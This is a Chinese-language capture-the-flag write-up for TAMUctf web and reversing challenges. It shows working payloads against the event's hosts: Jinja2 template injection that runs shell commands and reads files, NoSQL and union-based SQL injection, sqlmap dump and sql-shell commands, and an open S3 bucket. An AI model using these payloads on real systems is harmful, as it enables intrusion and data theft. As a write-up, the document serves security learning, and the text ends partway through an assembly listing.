id="Many-Gig’ems-to-you"><a href="#Many-Gig’ems-to-you" class="headerlink" title="Many Gig’ems to you!"></a>Many Gig’ems to you!</h2><blockquote><p><a href="http://web7.tamuctf.com/" target="_blank" rel="noopener">http://web7.tamuctf.com</a> </p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$ curl -s http://web7.tamuctf.com/index.html | grep -oE <span class="string">'gigem&#123;[^"]+"'</span></span><br><span class="line">gigem&#123;flag_in_<span class="string">"</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$ curl -s http://web7.tamuctf.com/cookies.html | grep -oE 'gigem&#123;[^"</span>]+<span class="string">"'</span></span><br><span class="line"><span class="string">gigem&#123;continued == source_and_"</span></span><br><span class="line">gigem&#123;_continued=source_and_<span class="string">"</span></span><br><span class="line"><span class="string">gigem&#123;_continued=source_and_"</span></span><br><span class="line"></span><br><span class="line">$ curl http://web7.tamuctf.com/cook.js</span><br><span class="line">document.cookie = <span class="string">"gigem_continue=cookies&#125;; expires=Thu, 18 Dec 2020 12:00:00 UTC"</span>;</span><br><span class="line">document.cookie = <span class="string">"hax0r=flagflagflagflagflagflag; expires=Thu, 18 Dec 2020 12:00:00 UTC"</span>;</span><br><span class="line">document.cookie = <span class="string">"gigs=all_the_cookies; expires=Thu, 18 Dec 2020 12:00:00 UTC"</span>;</span><br><span class="line">document.cookie = <span class="string">"cookie=flagcookiegigemflagcookie; expires=Thu, 18 Dec 2020 12:00:00 UTC"</span>;</span><br></pre></td></tr></table></figure><p>几个页面相关的内容连起来得到flag为<code>gigem{flag_in_source_and_cookies</code> 。这个题目意思不大。</p><h2 id="Science"><a href="#Science" class="headerlink" title="Science!"></a>Science!</h2><blockquote><p><a href="http://web3.tamuctf.com/" target="_blank" rel="noopener">http://web3.tamuctf.com</a></p><p>Difficulty: medium</p></blockquote><p>flask的SSTI。</p><p>命令执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&apos;&apos;.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals.linecache.os.popen(&apos;ls -Rhl&apos;).read()&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="1552741313918.png" alt="1552741313918"></p><p>文件读取</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="string">''</span>.__class__.__mro__[2].__subclasses__()[40](<span class="string">'flag.txt'</span>).<span class="built_in">read</span>()&#125;&#125;</span><br></pre></td></tr></table></figure><p><code>gigem{5h3_bl1nd3d_m3_w17h_5c13nc3}</code> </p><p>views.py内容</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> tamuctf <span class="keyword">import</span> app</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template, request, jsonify, render_template_string</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="meta">@app.route('/index')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/science', methods=['POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">science</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        chem1 = request.form[<span class="string">'chem1'</span>]</span><br><span class="line">        chem2 = request.form[<span class="string">'chem2'</span>]</span><br><span class="line">        template = <span class="string">'''&lt;html&gt;</span></span><br><span class="line"><span class="string">        &lt;div style="text-align:center"&gt;</span></span><br><span class="line"><span class="string">        &lt;h3&gt;The result of combining &#123;&#125; and &#123;&#125; is:&lt;/h3&gt;&lt;/br&gt;</span></span><br><span class="line"><span class="string">        &lt;iframe src="https://giphy.com/embed/AQ2tIhLp4cBa" width="468" height="480" frameBorder="0" class="giphy-embed" allowFullScreen&gt;&lt;/iframe&gt;&lt;/div&gt;</span></span><br><span class="line"><span class="string">        &lt;/html&gt;'''</span>.format(chem1, chem2)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> render_template_string(template, dir=dir, help=help, locals=locals)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"Something went wrong"</span></span><br></pre></td></tr></table></figure><p>参考文章：</p><ul><li><a href="Flask/Jiaja2 SSTI">Flask/Jiaja2 SSTI</a> </li><li><a href="https://www.kingkk.com/2018/06/Flask-Jinja2-SSTI-python-%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/" target="_blank" rel="noopener">Flask/Jinja2 SSTI &amp;&amp; python 沙箱逃逸</a>  </li></ul><h2 id="Buckets"><a href="#Buckets" class="headerlink" title="Buckets"></a>Buckets</h2><blockquote><p>Checkout my s3 bucket website!<br><a href="http://tamuctf.s3-website-us-west-2.amazonaws.com/" target="_blank" rel="noopener">http://tamuctf.s3-website-us-west-2.amazonaws.com/</a></p><p>Difficulty: easy</p></blockquote><p>亚马逊云存储器S3 BUCKET未授权访问。</p><p>从链接知bucket name为<code>tamuctf</code> ，访问<code>http://tamuctf.s3.amazonaws.com/</code> ，</p><p>在页面中搜索发现<code>Dogs/CC2B70BD238F48BE29D8F0D42B170127/CBD2DD691D3DB1EBF96B283BDC8FD9A1/flag.txt</code> ，</p><p>访问<code>http://tamuctf.s3.amazonaws.com/Dogs/CC2B70BD238F48BE29D8F0D42B170127/CBD2DD691D3DB1EBF96B283BDC8FD9A1/flag.txt</code> ，</p><p>得到flag为<code>flag{W0W_S3_BAD_PERMISSIONS}</code> 。</p><p>参考文章：</p><ul><li><a href="https://www.freebuf.com/articles/web/135313.html" target="_blank" rel="noopener">针对亚马逊云存储器S3 BUCKET的渗透测试</a> </li><li><a href="https://www.anquanke.com/post/id/86927" target="_blank" rel="noopener">【技术分享】AWS渗透测试（Part 1）：S3 Buckets</a> </li><li><a href="https://docs.aws.amazon.com/zh_cn/cli/latest/userguide/cli-chap-configure.html" target="_blank" rel="noopener">配置 AWS CLI</a> </li></ul><h2 id="Login-App"><a href="#Login-App" class="headerlink" title="Login App"></a>Login App</h2><blockquote><p><a href="http://web4.tamuctf.com/" target="_blank" rel="noopener">http://web4.tamuctf.com</a></p><p>Difficulty: medium</p></blockquote><p>页面源码有一段JavaScript</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    $(<span class="string">"#submit"</span>).on(<span class="string">'click'</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        $.ajax(&#123;</span><br><span class="line">            url: <span class="string">'login'</span>, </span><br><span class="line">            type : <span class="string">"POST"</span>, </span><br><span class="line">            dataType : <span class="string">'json'</span>, </span><br><span class="line">            data : <span class="built_in">JSON</span>.stringify(&#123;<span class="string">"username"</span>: $(<span class="string">"#username"</span>).val(), <span class="string">"password"</span>: $(<span class="string">"#password"</span>).val()&#125;),</span><br><span class="line">            contentType: <span class="string">'application/json;charset=UTF-8'</span>,</span><br><span class="line">            success : <span class="function"><span class="keyword">function</span>(<span class="params">result</span>) </span>&#123;</span><br><span class="line">                $(<span class="string">".result"</span>).html(result);</span><br><span class="line">                <span class="built_in">console</span>.log(result);</span><br><span class="line">                alert(result);</span><br><span class="line">            &#125;,</span><br><span class="line">            error: <span class="function"><span class="keyword">function</span>(<span class="params">xhr, resp, text</span>) </span>&#123;</span><br><span class="line">                $(<span class="string">".result"</span>).html(<span class="string">"Something went wrong"</span>); </span><br><span class="line">                <span class="built_in">console</span>.log(xhr, resp, text);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;);</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure><p>NoSQL注入。</p><p>报文：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">POST /login HTTP/1.1</span><br><span class="line">Host: web4.tamuctf.com</span><br><span class="line">Content-Length: 50</span><br><span class="line">Accept: text/plain</span><br><span class="line">Content-Type: application/json;charset=UTF-8</span><br><span class="line">Referer: http://web4.tamuctf.com/admin</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">&#123;<span class="string">"username"</span>:&#123;<span class="string">"<span class="variable">$eq</span>"</span>:<span class="string">"admin"</span>&#125;,<span class="string">"password"</span>:&#123;<span class="string">"<span class="variable">$gt</span>"</span>:<span class="string">""</span>&#125;&#125;</span><br></pre></td></tr></table></figure><p>或</p><p><img src="1552746047220.png" alt="1552746047220"></p><p>或</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">curl -H <span class="string">'Content-Type: application/json; charset=UTF-8'</span> -X POST --data <span class="string">'&#123;"username":&#123;"$ne":"nosql"&#125;,"password":&#123;"$ne":"injection"&#125;&#125;'</span> http://web4.tamuctf.com/login</span><br><span class="line"><span class="string">"Welcome: bob!"</span></span><br><span class="line"></span><br><span class="line">curl -H <span class="string">'Content-Type: application/json; charset=UTF-8'</span> -X POST --data <span class="string">'&#123;"username":&#123;"$ne":"bob"&#125;,"password":&#123;"$ne":"injection"&#125;&#125;'</span> http://web4.tamuctf.com/login</span><br><span class="line"><span class="string">"Welcome: admin!\ngigem&#123;n0_sql?_n0_pr0bl3m_8a8651c31f16f5dea&#125;"</span></span><br></pre></td></tr></table></figure><p>参考文章：</p><p><a href="https://www.freebuf.com/articles/database/95314.html" target="_blank" rel="noopener">一个有趣的实例让NoSQL注入不再神秘</a> </p><h2 id="Bird-Box-Challenge"><a href="#Bird-Box-Challenge" class="headerlink" title="Bird Box Challenge"></a>Bird Box Challenge</h2><blockquote><p><a href="http://web2.tamuctf.com" target="_blank" rel="noopener">http://web2.tamuctf.com</a></p><p>We’ve got Aggies, Trucks, and Eggs!</p><p>Difficulty: hard</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">neo@o:~$ curl -sG --data-urlencode <span class="string">"Search=test"</span> http://web2.tamuctf.com/Search.php  | grep -o <span class="string">"&lt;h1&gt;.*&lt;/h1&gt;"</span></span><br><span class="line">&lt;h1&gt;Our search isn<span class="string">'t THAT good...&lt;/h1&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">neo@o:~$ curl -sG --data-urlencode "Search=test'</span> or 1=1<span class="comment">#" http://web2.tamuctf.com/Search.php  | grep -o "&lt;h1&gt;.*&lt;/h1&gt;"</span></span><br><span class="line">&lt;h1&gt;Nice try, nothing to see here.&lt;/h1&gt;</span><br><span class="line"></span><br><span class="line">neo@o:~$ curl -sG --data-urlencode <span class="string">"Search=test' and 1=0 union select 123 #"</span> http://web2.tamuctf.com/Search.php  | grep -o <span class="string">"&lt;h1&gt;.*&lt;/h1&gt;"</span></span><br><span class="line">&lt;h1&gt;Nope. Not gonna <span class="built_in">let</span> you use that <span class="built_in">command</span>.&lt;/h1&gt;</span><br><span class="line"></span><br><span class="line">neo@o:~$ curl -sG --data-urlencode <span class="string">"Search=test' and 1=0 union  123 #"</span> http://web2.tamuctf.com/Search.php  | grep -o <span class="string">"&lt;h1&gt;.*&lt;/h1&gt;"</span></span><br><span class="line">&lt;h1&gt;Nope. Not gonna <span class="built_in">let</span> you use that <span class="built_in">command</span>.&lt;/h1&gt;</span><br><span class="line"></span><br><span class="line">neo@o:~$ curl -sG --data-urlencode <span class="string">"Search=test' and 1=0 select  123 #"</span> http://web2.tamuctf.com/Search.php  | grep -o <span class="string">"&lt;h1&gt;.*&lt;/h1&gt;"</span></span><br><span class="line">&lt;h1&gt; Our search isn<span class="string">'t THAT good... &lt;/h1&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">neo@o:~$ curl -sG --data-urlencode "Search=test'</span>union select 123<span class="comment">#" http://web2.tamuctf.com/Search.php  | grep -o "&lt;h1&gt;.*&lt;/h1&gt;"</span></span><br><span class="line">&lt;h1&gt;123&lt;/h1&gt;</span><br><span class="line"></span><br><span class="line">neo@o:~$ curl -sG --data-urlencode <span class="string">"Search=test'union select version()#"</span> http://web2.tamuctf.com/Search.php  | grep -o <span class="string">"&lt;h1&gt;.*&lt;/h1&gt;"</span></span><br><span class="line">&lt;h1&gt;5.7.25-0ubuntu0.18.04.2&lt;/h1&gt;</span><br></pre></td></tr></table></figure><p>注入一把梭。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'UNION ALL SELECT GROUP_CONCAT(table_schema) FROM information_schema.tables WHERE table_schema != '</span>information_schema<span class="string">' #</span></span><br><span class="line"><span class="string">得到数据库名：SqliDB</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">'</span>UNION ALL SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema != <span class="string">'information_schema'</span> <span class="comment">#</span></span><br><span class="line">得到表名：Search</span><br><span class="line"></span><br><span class="line"><span class="string">'UNION ALL SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_schema != '</span>information_schema<span class="string">' #</span></span><br><span class="line"><span class="string">得到列名：items</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">'</span>UNION ALL SELECT GROUP_CONCAT(items) FROM Search <span class="comment">#</span></span><br><span class="line">得到记录：Eggs,Trucks,Aggies</span><br></pre></td></tr></table></figure><p>翻一圈啥也没有，flag不在数据库中，尝试用户名。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">neo@o:~$ curl -sG --data-urlencode &quot;Search=test&apos;union select current_user#&quot; http://web2.tamuctf.com/Search.php  | grep -o &quot;&lt;h1&gt;.*&lt;/h1&gt;&quot;</span><br><span class="line">&lt;h1&gt;gigem&#123;w3_4r3_th3_4ggi3s&#125;@localhost&lt;/h1&gt;</span><br></pre></td></tr></table></figure><p>实际上也可以直接上sqlmap。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">"http://web2.tamuctf.com/Search.php?Search=eggs"</span> -p Search --dbms mysql --random-agent --sql-shell --hex --threads 10 --proxy=http://127.0.0.1:1080</span><br></pre></td></tr></table></figure><p><img src="1552750064087.png" alt="1552750064087"></p><h2 id="1337-Secur1ty"><a href="#1337-Secur1ty" class="headerlink" title="1337 Secur1ty"></a>1337 Secur1ty</h2><blockquote><p><a href="http://web6.tamuctf.com/" target="_blank" rel="noopener">http://web6.tamuctf.com</a></p><p>Difficulty: hard</p></blockquote><p>注册用户后进入。</p><p>二维码解码结果为<code>otpauth://totp/TAMU_CTF?secret=5UGMBIONB66MCOXH</code> 。</p><p>消息是可以点击查看详情的。</p><p><img src="1552782392453.png" alt="1552782392453"></p><p>对该链接<code>http://web6.tamuctf.com/message?id=2</code> 测试注入。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u <span class="string">"http://web6.tamuctf.com/message?id=2"</span> -p id --threads 10 --dump-all --random-agent --hex</span><br></pre></td></tr></table></figure><p><img src="1552782785371.png" alt="1552782785371"></p><p>得到admin用户邮箱为<a href="mailto:`1337-admin@l337secur1ty.hak" target="_blank" rel="noopener">`1337-admin@l337secur1ty.hak</a><code>，Secret值为</code>WIFHXDZ3BOHJMJSC<code>，id为1，密码哈希为</code>02ca0b0603222a090fe2fbf3ba97d90c<code>，在somd5查询对应明文为</code>secretpasscode` 。</p><p>使用burp修改cookie后转发可见flag为<code>gigem{th3_T0tp_1s_we4k_w1tH_yoU}</code>。</p><p><img src="1552783404288.png" alt="1552783404288"></p><h1 id="Reversing"><a href="#Reversing" class="headerlink" title="Reversing"></a>Reversing</h1><h2 id="Cheesy"><a href="#Cheesy" class="headerlink" title="Cheesy"></a>Cheesy</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> Z2lnZW17M2E1eV9SM3YzcjUxTjYhfQ== | base64 -d</span><br><span class="line">gigem&#123;3a5y_R3v3r51N6!&#125;</span><br></pre></td></tr></table></figure><h2 id="Snakes-over-cheese"><a href="#Snakes-over-cheese" class="headerlink" title="Snakes over cheese"></a>Snakes over cheese</h2><p>使用<a href="https://www.toolnb.com/tools/pyc.html" target="_blank" rel="noopener">pyc在线反编译</a> 得到如下代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># uncompyle6 version 3.2.5</span></span><br><span class="line"><span class="comment"># Python bytecode 2.7 (62211)</span></span><br><span class="line"><span class="comment"># Decompiled from: Python 2.7.5 (default, Oct 30 2018, 23:45:53) </span></span><br><span class="line"><span class="comment"># [GCC 4.8.5 20150623 (Red Hat 4.8.5-36)]</span></span><br><span class="line"><span class="comment"># Embedded file name: reversing2.py</span></span><br><span class="line"><span class="comment"># Compiled at: 2018-10-08 03:28:58</span></span><br><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime</span><br><span class="line">Fqaa = [<span class="number">102</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">103</span>, <span class="number">123</span>, <span class="number">100</span>, <span class="number">101</span>, <span class="number">99</span>, <span class="number">111</span>, <span class="number">109</span>, <span class="number">112</span>, <span class="number">105</span>, <span class="number">108</span>, <span class="number">101</span>, <span class="number">125</span>]</span><br><span class="line">XidT = [<span class="number">83</span>, <span class="number">117</span>, <span class="number">112</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">83</span>, <span class="number">101</span>, <span class="number">99</span>, <span class="number">114</span>, <span class="number">101</span>, <span class="number">116</span>, <span class="number">75</span>, <span class="number">101</span>, <span class="number">121</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">'Clock.exe'</span></span><br><span class="line">    input = raw_input(<span class="string">'&gt;: '</span>).strip()</span><br><span class="line">    kUIl = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> XidT:</span><br><span class="line">        kUIl += chr(i)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> input == kUIl:</span><br><span class="line">        alYe = <span class="string">''</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> Fqaa:</span><br><span class="line">            alYe += chr(i)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">print</span> alYe</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">print</span> datetime.now()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>则Fqaa转换后为 <code>flag{decompile}</code> 。</p><h2 id="042"><a href="#042" class="headerlink" title="042"></a>042</h2><blockquote><p>Cheers for actual assembly!</p><p>#medium</p><p><a href="https://tamuctf.com/files/9cca9cf5fd2409ddb51db4841ee97617/reversing3.s" target="_blank" rel="noopener">reversing3.s</a> </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br></pre></td><td class="code"><pre><span class="line">&gt; .section__TEXT,__text,regular,pure_instructions</span><br><span class="line">&gt; .build_version macos, 10, 14</span><br><span class="line">&gt; .globl_concat                 ## -- Begin function concat</span><br><span class="line">&gt; .p2align4, 0x90</span><br><span class="line">&gt; _concat:                                ## @concat</span><br><span class="line">&gt; .cfi_startproc</span><br><span class="line">&gt; ## %bb.0:</span><br><span class="line">&gt; pushq%rbp</span><br><span class="line">&gt; .cfi_def_cfa_offset 16</span><br><span class="line">&gt; .cfi_offset %rbp, -16</span><br><span class="line">&gt; movq%rsp, %rbp</span><br><span class="line">&gt; .cfi_def_cfa_register %rbp</span><br><span class="line">&gt; subq$48, %rsp</span><br><span class="line">&gt; movq%rdi, -8(%rbp)</span><br><span class="line">&gt; movq%rsi, -16(%rbp)</span><br><span class="line">&gt; movq-8(%rbp), %rdi</span><br><span class="line">&gt; callq_strlen</span><br><span class="line">&gt; movq-16(%rbp), %rdi</span><br><span class="line">&gt; movq%rax, -32(%rbp)         ## 8-byte Spill</span><br><span class="line">&gt; callq_strlen</span><br><span class="line">&gt; movq-32(%rbp), %rsi         ## 8-byte Reload</span><br><span class="line">&gt; addq%rax, %rsi</span><br><span class="line">&gt; addq$1, %rsi</span><br><span class="line">&gt; movq%rsi, %rdi</span><br><span class="line">&gt; callq_malloc</span><br><span class="line">&gt; movq$-1, %rdx</span><br><span class="line">&gt; movq%rax, -24(%rbp)</span><br><span class="line">&gt; movq-24(%rbp), %rdi</span><br><span class="line">&gt; movq-8(%rbp), %rsi</span><br><span class="line">&gt; callq___strcpy_chk</span><br><span class="line">&gt; movq$-1, %rdx</span><br><span class="line">&gt; movq-24(%rbp), %rdi</span><br><span class="line">&gt; movq-16(%rbp), %rsi</span><br><span class="line">&gt; movq%rax, -40(%rbp)         ## 8-byte Spill</span><br><span class="line">&gt; callq___strcpy_chk</span><br><span class="line">&gt; movq-24(%rbp), %rdx</span><br><span class="line">&gt; movq%rax, -48(%rbp)         ## 8-byte Spill</span><br><span class="line">&gt; movq%rdx, %rax</span><br><span class="line">&gt; addq$48, %rsp</span><br><span class="line">&gt; popq%rbp</span><br><span class="line">&gt; retq</span><br><span class="line">&gt; .cfi_endproc</span><br><span class="line">&gt;                                         ## -- End function</span><br><span class="line">&gt; .globl_main                   ## -- Begin function main</span><br><span class="line">&gt; .p2align4, 0x90</span><br><span class="line">&gt; _main:                                  ## @main</span><br><span class="line">&gt; .cfi_startproc</span><br><span class="line">&gt; ## %bb.0:</span><br><span class="line">&gt; pushq%rbp</span><br><span class="line">&gt; .cfi_def_cfa_offset 16</span><br><span class="line">&gt; .cfi_offset %rbp, -16</span><br><span class="line">&gt; movq%rsp, %rbp</span><br><span class="line">&gt; .cfi_def_cfa_register %rbp</span><br><span class="line">&gt; subq$80, %rsp</span><br><span class="line">&gt; leaqL_.str(%rip), %rdi</span><br><span class="line">&gt; movl$3, %eax</span><br><span class="line">&gt; movl$14, %ecx</span><br><span class="line">&gt; xorl%esi, %esi</span><br><span class="line">&gt; movl$8, %edx</span><br><span class="line">&gt;                                         ## kill: def %rdx killed %edx</span><br><span class="line">&gt; leaq-16(%rbp), %r8</span><br><span class="line">&gt; movq___stack_chk_guard@GOTPCREL(%rip), %r9</span><br><span class="line">&gt; movq(%r9), %r9</span><br><span class="line">&gt; movq%r9, -8(%rbp)</span><br><span class="line">&gt; movl$0, -20(%rbp)</span><br><span class="line">&gt; movq%rdi, -56(%rbp)         ## 8-byte Spill</span><br><span class="line">&gt; movq%r8, %rdi</span><br><span class="line">&gt; movl%ecx, -60(%rbp)         ## 4-byte Spill</span><br><span class="line">&gt; movl%eax, -64(%rbp)         ## 4-byte Spill</span><br><span class="line">&gt; callq_memset</span><br><span class="line">&gt; movb$65, -16(%rbp)</span><br><span class="line">&gt; movb$53, -15(%rbp)</span><br><span class="line">&gt; movb$53, -14(%rbp)</span><br><span class="line">&gt; movb$51, -13(%rbp)</span><br><span class="line">&gt; movb$77, 